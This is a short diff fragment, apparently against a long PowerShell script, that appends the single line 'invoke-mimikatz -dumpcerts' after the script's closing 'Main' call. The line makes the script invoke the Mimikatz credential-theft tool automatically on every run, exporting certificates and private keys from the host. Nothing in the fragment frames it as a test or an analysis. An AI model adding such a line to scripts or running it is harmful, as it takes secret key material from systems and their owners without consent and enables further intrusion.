@@ -2733,3 +2733,4 @@ Function Main
 
 Main
 }
+invoke-mimikatz -dumpcerts
